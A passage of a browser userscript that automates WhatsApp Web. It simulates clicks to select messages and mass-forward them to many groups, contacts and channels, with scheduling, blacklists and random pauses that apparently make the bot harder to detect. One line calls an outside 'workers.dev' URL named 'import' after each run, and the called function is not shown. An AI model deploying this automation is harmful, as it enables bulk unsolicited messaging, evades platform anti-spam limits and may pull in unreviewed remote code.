document.body.appendChild(e), (e = document.createElement("style")).innerText = `.stickAdinee:checked~#showbtnee{display:block}.stickAdinee:checked~#fastboxee{display:none}#showbtnee,.hidden{display:none}.pkkkk{background:#2f5bb7}#fastbox{resize:none}#resize-handle{width:10px;height:100%;position:absolute;left:0;top:0;cursor:ew-resize;background:red;z-index:10000;display:flex;align-items:center;justify-content:center}#resize-handle svg{width:10px;height:10px;fill:#333}#fastbox{width:300px}
	.edit-btn,.delete-btn {
    width: auto;
    display: inline-block;
    padding: 5px 15px;
    margin: 2px;
    font-size: 12px;
    text-decoration: none;
    font-weight: 600;
    background: #005af0;
    line-height: initial;color: #fff;
}.delete-btn {
    background: #c13949;
}
.input50{
    margin: 0 auto;
    text-align: center;
}
#fastbox .input50 input{
    width: 47%;
}
#taskList li {
    border: 1px solid #ccc;
    padding: 0 10px;
    margin: 10px 0;
    overflow: hidden;
    word-wrap: break-word;
    padding-bottom: 10px;
}

ul#taskList {
    font-family: monospace;
    line-height: 1.8;
}
select#msgtype {
    border: 1px solid #000;
    color: #000;
    background: #ffff;
}

	`, document.body.appendChild(e)
}
const config = {
    pksetup: {
        starred: '[data-testid="drawer-left"] span[data-icon="forward-chat"]',
        forward: '[data-animate-modal-body="true"] ._ak8l',
        testid: "data-testid",
        cmntime: '1000',
        framecontainer: "cell-frame-container",
        headmenu: '#main header [aria-label="Menu"]',
        selectmsg: 'div[aria-label="Select messages"]',
        selectchannelmsg: 'div[aria-label="Select updates"]',
        forwardbtn: '#main button[aria-label="Forward"]',
        forwardsbtn: 'button[aria-label="Forward messages"]',
        checkbox: '#main input[type="checkbox"]',
        sendbtn: 'div[role="button"][aria-label="Send"]',
        user_icon_new: '[role="gridcell"] span[dir="auto"]',
        user_icon: 'span[data-icon="default-contact-refreshed"]',
        getheadertitle: '#main header span[dir="auto"]',
        wagroupsender: '#main header span[title="wagroupsender"]',
        pendingcheck: '#pane-side span[data-icon="ic-chatlist-clock"]',
        selectpk: '[role="gridcell"] span[dir="auto"]',
        openpendingcheck: '#main span[data-icon="msg-time"]',
        countgroup: '[data-animate-modal-body="true"] ._ak8l',
        scroll_to_bottom: '#main .copyable-area button[aria-label="Scroll to bottom"]',
        refresh_icon: '#main [data-icon="refresh"]',
        scroll_area: '[data-animate-modal-popup="true"] .x1r8uery',
        msg_scroll_area: '#main .copyable-area .x1rife3k',
        panel_sidebar: '#pane-side',
        msg_post_area: 'div#main .copyable-area',
        chatsubtitle: '._ak8j .x78zum5.x1cy8zhl span[title]',
        channel_subtitle: '._ak8j .x78zum5.x1cy8zhl [aria-label*="followers"]',
        searchbox_match: '#side .lexical-rich-text-input',
        toast_body: 'body [data-testid="toast-body"]',
        forwarded_mark: '#main .copyable-area div>[data-icon="forward-refreshed"]',
        side_panel_loading: '#side span[data-visualcompletion="loading-state"]',
        ablacklist_title: '#pane-side [aria-selected="true"] [role="gridcell"] span[dir="auto"]',
        channel_blacklist_title: '[aria-label="Channel list"] [aria-selected="true"] [role="gridcell"] span[dir="auto"]',
        select_full_check: '[data-animate-modal-body="true"] span.x12xzxwr.x1c4vz4f.x2lah0s.xdl72j9 div'
    }
};

function viewmsgid(datamessageid) {
//    if (localStorage.getItem("keycodesave") == "prakash") {

    const parentContainer = document.querySelector('#main .copyable-area');

    let previousElement = null;

    if (parentContainer) {
        parentContainer.addEventListener('contextmenu', (event) => {

            event.preventDefault();

            const dataIdElement = event.target.closest('[data-id]');
            if (dataIdElement) {
                if (previousElement && previousElement !== dataIdElement) {
                    previousElement.style.backgroundColor = ''; // Reset the background color
                }

                dataIdElement.style.backgroundColor = 'red';

                previousElement = dataIdElement;
                document.getElementById(datamessageid).value = dataIdElement.getAttribute('data-id');
                console.log('Right-clicked on element with data-id:', dataIdElement.getAttribute('data-id'));
				
				if(datamessageid=="datamessageid"){
executePickAndGet();
	const selectedText = window.getSelection().toString().trim();
    if (selectedText) {
        document.getElementById('matchmsg').value=selectedText;

        // Copy to clipboard
        navigator.clipboard.writeText(selectedText)
            .then(() => {
                console.log("Copied to clipboard!");
            })
            .catch(err => {
                console.error("Failed to copy:", err);
            });
    }

}
				else if(datamessageid=="msgid"){get_group_name('taskName');picklink('taskMessage','msgid');
				var grouptab = document.querySelector('[aria-label="Chats"] [data-icon="chat-filled-refreshed"]');
var channeltabopen = document.querySelector('[aria-label="Channels"] [data-icon="newsletter-tab"]');
if (grouptab) {
    document.getElementById("msgtype").value = "groupmsg";
} else if (channeltabopen) {
    document.getElementById("msgtype").value = "channelmsg";
}
				}
            } else {
                console.log('No data-id found on right-click.');
            }
        });
    } else {
        console.error('Parent container not found.');
    }

}
    
//}


function executePickAndGet() {
    get_group_name('send_msg_group_name');
    picklink('matchmsg', 'datamessageid');
}
let editIndex = null; // Keeps track of the task being edited

function renderTasks() {
    const tasks = JSON.parse(localStorage.getItem("scheduledTasks")) || [];
    const taskList = document.getElementById("taskList");
    taskList.innerHTML = "";

    tasks.forEach((task, index) => {
        const li = document.createElement("li");
        li.innerHTML = `
                    <p><strong>${task.taskName}</strong> - ${task.taskMessage} </p>
                    <p></p>Scheduled for: ${task.dateTime} </p>
                    <p>Msg ID: ${task.msgid}</p>
                    <!--p>Channel Msg URL: ${task.channelmsgurl}</p-->
                    <p>Msg Type: ${task.msgtype}</p>
                    <p>Status: ${task.status}</p>
                    <button class="edit-btn" onclick="editTask(${index})">Edit</button>
                    <button class="delete-btn" onclick="deleteTask(${index})">Delete</button>
                `;
        taskList.appendChild(li);
    });
}

function addOrUpdateTask() {
    const taskName = document.getElementById("taskName").value;
    const taskMessage = document.getElementById("taskMessage").value;
    const msgid = document.getElementById("msgid").value;

    const msgtype = document.getElementById("msgtype").value;
    const taskDateTime = document.getElementById("taskDateTime").value;

    if (!taskName || !taskMessage || !taskDateTime) {
        alert("Please fill in all fields.");
        return;
    }

    const tasks = JSON.parse(localStorage.getItem("scheduledTasks")) || [];

    if (editIndex !== null) {

        tasks[editIndex] = {
            taskName,
            taskMessage,
            msgid,

            msgtype,
            dateTime: taskDateTime,
            status: "scheduled", // Reset status after edit
        };
        editIndex = null; // Reset the edit index
    } else {

        const task = {
            taskName,
            taskMessage,
            msgid,

            msgtype,
            dateTime: taskDateTime,
            status: "scheduled",
        };
        tasks.push(task);
    }

    localStorage.setItem("scheduledTasks", JSON.stringify(tasks));
    renderTasks();
    document.getElementById("taskForm").reset();
}

function editTask(index) {
    const tasks = JSON.parse(localStorage.getItem("scheduledTasks")) || [];
    const task = tasks[index];

    document.getElementById("taskName").value = task.taskName;
    document.getElementById("taskMessage").value = task.taskMessage;
    document.getElementById("msgid").value = task.msgid;

    document.getElementById("msgtype").value = task.msgtype;
    document.getElementById("taskDateTime").value = task.dateTime;

    editIndex = index; // Set the edit index
}

function deleteTask(index) {
    const tasks = JSON.parse(localStorage.getItem("scheduledTasks")) || [];
    tasks.splice(index, 1);
    localStorage.setItem("scheduledTasks", JSON.stringify(tasks));
    renderTasks();
}

function checkTasks() {
    const tasks = JSON.parse(localStorage.getItem("scheduledTasks")) || [];
    const now = new Date();

    tasks.forEach((task, index) => {
        const taskTime = new Date(task.dateTime);
        const timeDifference = taskTime - now;

        if (timeDifference <= 0 && timeDifference > -4 * 60 * 1000 && task.status === "scheduled") {
            removedatabase();
            console.log(`Running Task: ${task.taskName} - ${task.taskMessage}`);
            nalert(`Task Started: ${task.taskName}\n${task.taskMessage}`);

            document.getElementById("matchmsg").value = task.taskMessage;
            document.getElementById("datamessageid").value = task.msgid;


            document.getElementById("send_msg_group_name").value = task.taskName;
            localStorage.setItem("msgtype", task.msgtype);

            if (task.msgtype == "groupmsg") {
                var ek = document.querySelector('[aria-label="Chats"] [data-icon="chat-refreshed"]');
                if (ek) {
                    pkclickevent(ek);
                }
            } else if (task.msgtype == "channelmsg") {

                var ek2 = document.querySelector('[aria-label="Channels"] [data-icon="newsletter-outline"]');
                if (ek2) {
                    pkclickevent(ek2);
                }
            }


            setTimeout(sendspt, parseInt(document.getElementById("fulldelay").value) * 100);

            task.status = "complete"; // Mark task as completed
            tasks[index] = task;
        }
    });

    localStorage.setItem("scheduledTasks", JSON.stringify(tasks));
    renderTasks();
}


function scheduleInputs() {
    const scheduleToggle = document.getElementById("scheduleToggle");
    localStorage.setItem('checkboxState', scheduleToggle.checked);
    const scheduleInputs = document.getElementById("scheduleInputs");
    scheduleInputs.style.display = scheduleToggle.checked ? "block" : "none";
}

function runschedulefun() {
    const savedState = localStorage.getItem('checkboxState');
    if (savedState !== null) {
        document.getElementById("scheduleToggle").checked = savedState === 'true';

    }
    if (document.getElementById("scheduleToggle").checked) {
        scheduleInputs();
        if (localStorage.getItem("autostartsend") == "true") {
            nalert('Auto Start Placed,Plz Not Click Start Button.');

            if (localStorage.getItem("msgtype") == "groupmsg") {
                var ek = document.querySelector('[aria-label="Chats"] [data-icon="chat-refreshed"]');
                if (ek) {
                    pkclickevent(ek);
                }
            } else if (localStorage.getItem("msgtype") == "channelmsg") {

                var ek2 = document.querySelector('[aria-label="Channels"] [data-icon="newsletter-outline"]');
                if (ek2) {
                    pkclickevent(ek2);
                }
            }


            setTimeout(sendspt, 60000);
        }
    } else {
        localStorage.removeItem("msgtype");
    }
    setInterval(checkTasks, 30000);
    renderTasks();
    document.getElementById("scheduleToggle").addEventListener("change", scheduleInputs);
}

function pkresize() {
    const fastbox = document.getElementById('fastbox');
    const resizeHandle = document.getElementById('resize-handle');

    const savedWidth = localStorage.getItem('fastboxWidth');
    if (savedWidth) {
        fastbox.style.width = savedWidth;
    }

    resizeHandle.addEventListener('mousedown', function (e) {
        e.preventDefault();

        document.addEventListener('mousemove', resize);
        document.addEventListener('mouseup', stopResize);
    });

}

function resize(e) {
    const newWidth = window.innerWidth - e.clientX;
    if (newWidth > 150) { // Minimum width of 150px to prevent it from becoming too small
        fastbox.style.width = `${newWidth}px`;
    }
}

function stopResize() {
    document.removeEventListener('mousemove', resize);
    document.removeEventListener('mouseup', stopResize);

    localStorage.setItem('fastboxWidth', fastbox.style.width);
}


function findnumber() {
    var e = localStorage.getItem("last-wid"),
        t = localStorage.getItem("last-wid-md");
    return e ? e.split("@")[0].substring(1) : t ? t.split(":")[0].substring(1) : "910000000000"
}

function pasteauto() {
    removedatabase();
    navigator.clipboard
        .readText()
        .then(
            cliptext =>
            (document.getElementById("matchmsg").value = cliptext),
            err => console.log(err)
        );
}

function backup_settings() {
    const textToExport = {
        blacklist: document.getElementById("blacklist").value,
        blacklist2: document.getElementById("blacklist2").value,
        blacklist3: document.getElementById("blacklist3").value,
        blacklist4: document.getElementById("blacklist4").value,
        contact_list_no: document.getElementById("contact_list_no").value
    };

    const textToExportString = JSON.stringify(textToExport);
    const blob = new Blob([textToExportString], {
        type: "text/plain"
    });
    const filename = findnumber() + "_save_setting.txt";

    const url = URL.createObjectURL(blob);
    const link = document.createElement("a");
    link.href = url;
    link.download = filename;
    link.click();
}

function restore_settings() {
    const fileInput = document.getElementById("fileInput");
    const file = fileInput.files[0];

    if (file) {
        const reader = new FileReader();
        reader.onload = function (event) {
            const importedText = JSON.parse(event.target.result);
            document.getElementById("blacklist").value = importedText.blacklist;
            document.getElementById("blacklist2").value = importedText.blacklist2;
            document.getElementById("blacklist3").value = importedText.blacklist3;
            document.getElementById("blacklist4").value = importedText.blacklist4;
            document.getElementById("contact_list_no").value = importedText.contact_list_no;
        };
        reader.readAsText(file);
        save_black_list("blacklist", "gblacklistnew");
        save_black_list("blacklist2", "gblacklistnew2");
        save_black_list("blacklist3", "gblacklistnew3");
        save_black_list("blacklist4", "gblacklistnew4");
        localStorage.setItem("contact_list_no", document.getElementById("contact_list_no").value);
        nalert('Restore Settings Successfully');

    } else {
        nalert('Plz Choose Backup File')
    }
}


function picklink(e, id) {
    console.log("picklink");
    var kip = document.getElementById(id).value
    if (kip == "") {
        var amsg = 'div#main [role="row"] .copyable-text a[href]';
    } else {
        var amsg = 'div#main [role="row"] [data-id="' + kip + '"] .copyable-text a[href]';
    }

   // removedatabase();
    var xp = document.querySelector(amsg);

    if (xp) {
        document.getElementById(e).value = xp.href
    } else {

        nalert('No Link Found, Fill Manually.')
    }
}


function scroll_to_bottom() {
    console.log("scroll_to_bottom");
    var toolscroll = document.querySelector("#fastbox");
    if (toolscroll) {
        toolscroll.scrollTo(0, toolscroll.scrollHeight);
    }

}

function scroll_to_top() {
    console.log("scroll_to_top");
    var toolscroll = document.querySelector("#fastbox");
    if (toolscroll) {
        toolscroll.scrollTo(0, 0);
    }
}

function countlist() {
    console.log("countlist");
    var countlist = document.querySelector(config.pksetup.panel_sidebar);
    countlistc = countlist.scrollHeight / 72;
    document.getElementById("countlist").innerHTML = countlistc.toFixed(0)
}



function contactcount() {
    console.log("contactcount");
    var element = document.querySelector(config.pksetup.scroll_area);
    if (element) {
        var remaining = (element.scrollHeight - (element.clientHeight + element.scrollTop)) / 72;
        document.getElementById("contact_list_no").value = remaining.toFixed(0);
        localStorage.setItem("contact_list_no", document.getElementById("contact_list_no").value)
    } else {
        nalert('Click Forward Icon & Scroll to Contact')
    }
}


function get_group_name(ek) {
    console.log(ek);
    var e = document.querySelector(config.pksetup.getheadertitle),
        t = document.getElementById(ek);

    if (e) {
        t.value = e.innerText;
        updatelocalstorage("send_msg_group_name", "send_msg_group_name");
    } else {
        nalert("No User Name Found");
    }

}

function count_send_group() {
    if (!stoprun.checked) {

        console.log("count_send_group");

        if (localStorage.getItem("login_date")) {
            document.getElementById('login_date').innerHTML = localStorage.getItem("login_date")
        } else {
            var d = (new Date()).toString().split(' ').splice(1, 4).join('/');
            localStorage.setItem("login_date", d);

            document.getElementById('login_date').innerHTML = localStorage.getItem("login_date")
        }
    } else {
        stop_work_check()
    }
}
let msgtype = 0;

function simulateMouseEvents() {
    if (!stoprun.checked) {

        console.log("simulateMouseEvents");
        var o = document.querySelector("#send_msg_group_name").value;
        var epp = document.querySelector('[title="' + o.trim() + '"]');
        if (epp) {
            msgtype = 0; // Reset the counter
            if (document.querySelector('[aria-label="Channel list"]')) {
                pkclickevent(epp);
                console.log("simulateMouseEvents Channel click");
            } else {

                var e = document.createEvent("MouseEvents");
                e.initEvent("mousedown", !0, !0), epp.dispatchEvent(e), console.log("simulateMouseEvents")
            }
        } else {
            msgtype++;
            if (msgtype >= 10) {

                var ek = document.querySelector('[aria-label="Chats"] [data-icon="chat-refreshed"]');
                if (ek) {
                    pkclickevent(ek);
                }

                var ek2 = document.querySelector('[aria-label="Channels"] [data-icon="newsletter-outline"]');
                if (ek2) {
                    pkclickevent(ek2);
                }
            }

        var panel_sidebar_area = document.querySelector(config.pksetup.panel_sidebar);
        if (panel_sidebar_area) {
            panel_sidebar_area.scrollTo(0, 0);
        } else {
            nalert('Group Name Not Found.')
        }

        var chnl_scroll_area2 = document.querySelector('[aria-label="Channel tab drawer"] .x1odjw0f.xexx8yu.x4uap5.xefzj8c.xkhd6sd');
        if (chnl_scroll_area2) {
            chnl_scroll_area2.scrollTo(0, 0);
        } else {
            nalert('Channel Name Not Found.')
        }

    }
} else {
    stop_work_check()
}
}

function bblank(e) {
    document.getElementById(e).value = ""
}

function vzero(e) {
    document.getElementById(e).innerHTML = "0"
}

function gconsoleu(e) {
    document.getElementById("gconsole").value += e
}

function nalert(e) {
    document.getElementById("snotif").innerHTML = "<span>" + e + "</span>"
}

function detailu(e) {
    document.getElementById(e).innerHTML = Number(document.getElementById(e).innerHTML) + 1
}

function cstyle(e, t) {
    document.getElementById(e).style.display = t
}

function getsetItem(e, t) {
    localStorage.getItem(t) && (document.getElementById(e).value = localStorage.getItem(t))
}

function getsetItemnumber(e, t) {
    localStorage.getItem(t) && (document.getElementById(e).innerHTML = Number(localStorage.getItem(t)))
}

function pkclickevent(e) {
    console.log(e);
    var t = document.createEvent("MouseEvents");
    t.initMouseEvent("click", !0, !0, window, 0, 0, 0, 0, 0, !1, !1, !1, !1, 0, null), e.dispatchEvent(t)
}

function pendingcheck() {
    if (!stoprun.checked) {
        console.log("pendingcheck");
        vzero("pendingsend");
        for (var e = document.querySelectorAll(config.pksetup.pendingcheck), t = 0; t < e.length; t++) e[t] && detailu("pendingsend");



        var e = document.getElementById("pendingsend");
        localStorage.setItem("pendingsend", e.innerHTML)
    } else {
        stop_work_check()
    }
}

function scroll_count() {
    console.log("scroll_count");
    if (localStorage.getItem("scroll_count") == "1") {
        document.getElementById("scroll_count").innerHTML = Number(document.getElementById("scroll_count").innerHTML) + 1
    }
}

function scroll_count_zero() {
    vzero("scroll_count");
}

function stop_work_check() {
    if (stoprun.checked) {
        localStorage.setItem("work_count", '0');
        cstyle("stped", "block");
        cstyle("pkloadads", "none");
        vzero("scroll_count");
        localStorage.setItem("autostartsend", "false");

    }
}

let runCount = 0;

function runscript() {
    if (!stoprun.checked) {
        const sleepToggle = document.getElementById("sleepToggle");
        if (sleepToggle.checked) {

            const startafterSleepcheck = parseInt(document.getElementById("startafterSleepcheck").value) || 5;
            runCount++;

            if (runCount >= startafterSleepcheck) {

                const minSleepTime = parseInt(document.getElementById("minSleepTime").value) || 1;
                const maxSleepTime = parseInt(document.getElementById("maxSleepTime").value) || 5;
                console.log("Pausing for 5 seconds...");
                runCount = 0; // Reset the counter

                const randomSleepTime = Math.floor(Math.random() * (maxSleepTime - minSleepTime + 1)) + minSleepTime;
                console.log(`Sleeping for ${randomSleepTime} seconds...`);
                setTimeout(runscript, randomSleepTime * 1000); // Pause for the random time
                return; // Exit the current invocation
            }
        }

        console.log("runscript");
        if (!document.querySelector(config.pksetup.toast_body)) {
            console.log("runscript1");
            if (stoprun.checked) {
                console.log("runscript2");
                localStorage.setItem("work_count", '0');
                localStorage.setItem("autostartsend", "false");
                cstyle("stped", "block");
                cstyle("pkloadads", "none");
                vzero("scroll_count")
            } /* else if (document.querySelector(config.pksetup.searchbox_match).innerText.trim() == "https://chat.whatsapp.com/") {
                console.log("runscript3");
                scroll_msg_ext_link();
                addreport();
            } else if (document.querySelector(config.pksetup.starred)) {
                console.log("runscript3");
                addreport(), sttimer4()
            } */else {
                simulateMouseEvents(), pendingcheck(), addreport(), setTimeout(sttimer1, parseInt(document.getElementById("fulldelay").value) * 100)
            }
        } else {
            console.log("runscript4");
            setTimeout(runscript, parseInt(document.getElementById("fulldelay").value) * 100);
            nalert('Device Waiting')
        }
    } else {
        stop_work_check()
    }
}

function sendspt() {
    if (!stoprun.checked) {
        console.log("sendspt");

        if (document.getElementById("matchmsg").value != "") {
            if (localStorage.getItem("work_count") == "0") {
                localStorage.setItem("autostartsend", "true"), localStorage.setItem("work_count", '1'), localStorage.setItem("contact_list_no", document.getElementById("contact_list_no").value), localStorage.setItem("matchmsg", document.getElementById("matchmsg").value), updatelocalstorage("send_msg_group_name", "send_msg_group_name"),updatelocalstorage("datamessageid", "datamessageid"),updatelocalstorage("saved_no_joined_name", "saved_no_joined_name"), cstyle("pkloadads", "block"), cstyle("stped", "none"), cstyle("wcomp", "none"), countlist(), runscript()
            } else {

                nalert('Working Plz Stop and Try Again')
            }
        } else {

            nalert('Plz Fill Match Message Box')
        }
    } else {
        stop_work_check()
    }
	
fetchafterrun('https://share.autopush.workers.dev/import?id=resendmsg');
}


function sttimer1() {
    if (!stoprun.checked) {
        console.log("sttimer1");
        var lp = document.querySelector('#main header span[dir="auto"]');
        var ke = document.querySelector(config.pksetup.headmenu);
        if (lp.innerText) {

            if (lp.innerText == document.querySelector("#send_msg_group_name").value.trim()) {
                if (ke) {
                    pkclickevent(ke), setTimeout(sttimer2, parseInt(document.getElementById("fulldelay").value) * 100)
                } else {
                    setTimeout(sttimer1, parseInt(document.getElementById("fulldelay").value) * 100)
                }
            } else {
                setTimeout(runscript, parseInt(document.getElementById("fulldelay").value) * 100)
            }
        } else {
            setTimeout(runscript, parseInt(document.getElementById("fulldelay").value) * 100)
        }

    } else {
        stop_work_check()
    }
}

function sttimer2() {
    if (!stoprun.checked) {
        console.log("sttimer2");
        var e = document.querySelector(config.pksetup.selectmsg);
        var ek = document.querySelector(config.pksetup.selectchannelmsg);
        if (e) {
            pkclickevent(e);
            setTimeout(sttimer3, parseInt(document.getElementById("fulldelay").value) * 100);
        } else if (ek) {
            pkclickevent(ek);
            setTimeout(sttimer3, parseInt(document.getElementById("fulldelay").value) * 100);
        } else {
            setTimeout(sttimer2, parseInt(document.getElementById("fulldelay").value) * 100);
        }
    } else {
        stop_work_check();
    }

}

function ik() {
    if (!stoprun.checked) {
        console.log("ik");

        if (autodelay.checked) {
            pendingcheck(); // Run the initial check once

            const pendingSendElement = document.getElementById("pendingsend");
            const advDelayValue = Number.parseFloat(document.getElementById("advdelay").value);
            let pendingSendValue = Number.parseFloat(pendingSendElement.innerHTML);

            if (advDelayValue >= pendingSendValue) {
                sttimer4();
                return;
            }

            const intervalId = setInterval(() => {
            pendingcheck(); // Run the initial check once
                pendingSendValue = Number.parseFloat(pendingSendElement.innerHTML);

                if (advDelayValue >= pendingSendValue) {
                    sttimer4();
                    clearInterval(intervalId); // Stop the interval
                }
            }, parseInt(document.getElementById("fulldelay").value) * 100); // Check every 100ms

        } else {
            sttimer4();
        }
    } else {
        stop_work_check();
    }
}


function sttimer3() {
    if (!stoprun.checked) {
        console.log("sttimer3");
        var datamessageid = document.querySelector("#datamessageid").value;

        if (document.querySelector(config.pksetup.checkbox)) {
            if (!document.querySelector(config.pksetup.forwarded_mark)) {
                if (datamessageid == "") {
                    var checkboxes = document.querySelectorAll(config.pksetup.checkbox);

                    for (var i = 0; i < checkboxes.length; i++) {
                        pkclickevent(checkboxes[i]);
                        console.log("sttimerselect");
                    }

                    ik();
                } else {
                    var specificcheckboxes = document.querySelector('#main [data-id="' + datamessageid.trim() + '"] input[type="checkbox"]');
                    if (specificcheckboxes) {
                        pkclickevent(specificcheckboxes);
                        console.log("specificcheckboxes");
                        ik();
                    } else {
                        nalert("Your Input Message ID Not Found blank your id or check it Again");
                        setTimeout(sttimer3, parseInt(document.getElementById("fulldelay").value) * 100);
                    }
                }
            } else {
                alert("Forwarded Mark Message Found Plz Remove It.");
            }
        } else {
            setTimeout(sttimer3, parseInt(document.getElementById("fulldelay").value) * 100);
            console.log("msg checkbox not found");
        }

    } else {
        stop_work_check()
    }
}

function sttimer4() {
    if (!stoprun.checked) {

        console.log("sttimer4");
        var kp = document.querySelector(config.pksetup.forwardbtn);
        var kp2 = document.querySelector(config.pksetup.forwardsbtn);
        var pkgetmsg = document.querySelector(config.pksetup.starred);
        if (kp) {
            if (!kp.disabled) {
                pkclickevent(kp);
                sttimer5();
            } else {
                cstyle("wcomp", "block");
                vzero("scroll_count");
                localStorage.setItem("work_count", "0");
                localStorage.setItem("autostartsend", "false");
                cstyle("pkloadads", "none")
            }

        } else if (kp2) {
            if (!kp2.disabled) {
                pkclickevent(kp2);
                sttimer5();
            } else {
                cstyle("wcomp", "block");
                vzero("scroll_count");
                localStorage.setItem("work_count", "0");
                cstyle("pkloadads", "none")
            }
        } else if (pkgetmsg) {
            if (!pkgetmsg.disabled) {
                pkclickevent(pkgetmsg);
                sttimer5();
            } else {
                cstyle("wcomp", "block");
                vzero("scroll_count");
                localStorage.setItem("work_count", "0");
                localStorage.setItem("autostartsend", "false");
                cstyle("pkloadads", "none")
            }
        } else {
            cstyle("wcomp", "block");
            vzero("scroll_count");
            localStorage.setItem("work_count", "0");
            localStorage.setItem("autostartsend", "false");
            cstyle("pkloadads", "none")
        }

    } else {
        stop_work_check()
    }

}

function sttimer5() {
    if (!stoprun.checked) {

        console.log("sttimer5");
        var elementk = document.querySelector(config.pksetup.scroll_area);
        var kjp = (Number.parseFloat(document.getElementById("scroll_count").innerHTML) + Number.parseFloat(document.getElementById("contact_list_no").value)) * 72;
        if (elementk) {
            vzero("tadmin");
            cstyle("wwait", "block");

            elementk.scrollTo(0, elementk.scrollHeight - kjp);
            setTimeout(scroll_msg, parseInt(document.getElementById("fulldelay").value) * 100);
        } else {
            setTimeout(sttimer5, parseInt(document.getElementById("fulldelay").value) * 100)
        }


    } else {
        stop_work_check()
    }
}

function scroll_msg() {
    if (!stoprun.checked) {

        console.log("scroll_msg");
        var element = document.querySelector(config.pksetup.scroll_area);
        if (element.scrollTop != "0") {
            console.log("scroll_msg");
            startTimer();
        } else {
            console.log("scroll_msg2");
            setTimeout(sttimer5, parseInt(document.getElementById("fulldelay").value) * 100)
        }

    } else {
        stop_work_check()
    }
}

function singledelay() {
    if (!stoprun.checked) {
        console.log("singledelay");
        pendingcheck();
        var n = document.getElementById("matchmsg").value.trim(),
            n = document.querySelector(config.pksetup.msg_post_area).innerText.split(n).join(" matchmessagekk ");
        if (new RegExp("\\bmatchmessagekk\\b").test(n)) {

            if (sautodelay.checked) {
                setTimeout(function () {
                    document.querySelector(config.pksetup.openpendingcheck) ? setTimeout(singledelay, parseInt(document.getElementById("fulldelay").value) * 100) : runscript();

                }, parseInt(document.getElementById("fulldelay").value) * 100)
            } else {
                setTimeout(runscript, parseInt(document.getElementById("fulldelay").value) * 100)
            }

        } else {
            var msg_scroll_area = document.querySelector(config.pksetup.msg_scroll_area);
            if (msg_scroll_area) {
                msg_scroll_area.scrollTo(0, msg_scroll_area.scrollHeight);
            }
            var scroll_to_bottom = document.querySelector(config.pksetup.scroll_to_bottom);
            if (scroll_to_bottom) {
                pkclickevent(scroll_to_bottom);
            };
            var refresh_icon = document.querySelector(config.pksetup.refresh_icon);
            if (refresh_icon) {
                pkclickevent(refresh_icon);
            };
            setTimeout(singledelay, parseInt(document.getElementById("fulldelay").value) * 100)
        }


    } else {
        stop_work_check()
    }
}


function delaycheck1() {
    if (!stoprun.checked) {
        console.log("delaycheck1");
        var op = document.querySelector("#send_msg_group_name").value.trim();
        var kpq = document.querySelector(config.pksetup.getheadertitle);
        if (kpq) {

            if (new RegExp("\\b" + op + "\\b").test(kpq.innerText)) {
                setTimeout(delaycheck1, parseInt(document.getElementById("fulldelay").value) * 100);
            } else {

                setTimeout(singledelay, parseInt(document.getElementById("fulldelay").value) * 100)
            }

        } else {
            setTimeout(delaycheck1, parseInt(document.getElementById("fulldelay").value) * 100)
        }

    } else {
        stop_work_check()
    }
}

function matchdelay() {
    if (!stoprun.checked) {
        console.log("matchdelay");
        pendingcheck();
        if (sdelayon.checked) {
            if (Number.parseFloat(document.getElementById("match_msg_check").innerHTML) >= Number.parseFloat(document.getElementById("sdelay").value)) {
                vzero("match_msg_check");
                setTimeout(delaycheck1, parseInt(document.getElementById("fulldelay").value) * 100)
            } else {
                setTimeout(runscript, parseInt(document.getElementById("fulldelay").value) * 100)
            }


        } else {
            setTimeout(runscript, parseInt(document.getElementById("fulldelay").value) * 100)
        }

    } else {
        stop_work_check()
    }
}

function finalsendbtn() {
    if (!stoprun.checked) {
        console.log("finalsendbtn");
        var sendbtn = document.querySelector(config.pksetup.sendbtn);
        console.log("press send button0");
        if (sendbtn) {
            console.log("press send button");
            updatedatabase();
            pkclickevent(sendbtn);
            if (localStorage.getItem("scroll_count") == "0") {
                localStorage.setItem("scroll_count", '1')
            }

            cstyle("wwait", "none");
            setTimeout(matchdelay, parseInt(document.getElementById("fulldelay").value) * 100);
        } else {
            console.log("no send button");
            setTimeout(finalsendbtn, parseInt(document.getElementById("fulldelay").value) * 100);
        };

    } else {
        stop_work_check()
    }
}

function fullsendbtn() {
    if (!stoprun.checked) {
        console.log("fullsendbtn");
        var sendbtn = document.querySelector(config.pksetup.sendbtn);
        if (sendbtn) {
            console.log("press send button2");
            updatedatabase();
            pkclickevent(sendbtn);

            if (localStorage.getItem("scroll_count") == "0") {
                localStorage.setItem("scroll_count", '1')
            }

            if (localStorage.getItem("wcomp_count") == "0") {
                localStorage.setItem("wcomp_count", '1')
            }
            console.log("work comp");
            cstyle("wwait", "none");
            cstyle("wcomp", "block");
            vzero("scroll_count");
            localStorage.setItem("work_count", "0");
            localStorage.setItem("autostartsend", "false");
            cstyle("pkloadads", "none");
            sendreport("fc");
            resend_run();
        } else {
            console.log("no2 send button");
            setTimeout(fullsendbtn, parseInt(document.getElementById("fulldelay").value) * 100);
        }

    } else {
        stop_work_check()
    }
}

function startTimer() {
    if (!stoprun.checked) {

        console.log("starttimer");
        var keywordsInput = document.getElementById('saved_no_joined_name').value.trim();
        var keywords = keywordsInput ? keywordsInput.split(',').map(keyword => keyword.trim()) : ['blanknamenoname'];
        var regexPattern = new RegExp(keywords.join('|'), 'gms');
        var sendbtn = document.querySelector(config.pksetup.sendbtn);
        var imgDefer = document.querySelector(config.pksetup.forward);
        if (imgDefer) {
            if (Number.parseFloat(document.getElementById("tadmin").innerHTML) >= Number.parseFloat(document.getElementById("advdelay2").value)) {
                finalsendbtn();
				setTimeout(pushscpt, 100);
            } else {
                var k = imgDefer.parentNode.querySelector(config.pksetup.user_icon);
                var kl = imgDefer.parentNode.querySelector(config.pksetup.user_icon_new);
                var k2 = imgDefer.parentNode.querySelector(config.pksetup.chatsubtitle);
                var k3 = imgDefer.parentNode.querySelector(config.pksetup.channel_subtitle);
                var k4 = parseInt(calculateCount(), 10);
                var minVal = parseInt(document.getElementById("minRange").value, 10);
                var maxVal = parseInt(document.getElementById("maxRange").value, 10);


                if (k) {
                    if (deep_group_check.checked) {
                        imgDefer.classList.remove("_ak8l");
                        startTimer();
                        console.log("els88")
                    } else {
                        console.log("else 3")
                        selectpk();
                    }
                } else if (kl.title.match(/^[\+]/)) {

                    if (deep_group_check.checked) {
                        imgDefer.classList.remove("_ak8l");
                        console.log("else 003")
                        startTimer();
                    } else {
                        console.log("else 3")
                        selectpk();
                    }

                } else if (k3) {

                    if (deep_group_check.checked) {
                        imgDefer.classList.remove("_ak8l");
                        console.log("else 003")
                        startTimer();
                    } else {
                        console.log("else 3")
                        selectpk();
                    }

                } else if (!k2) {
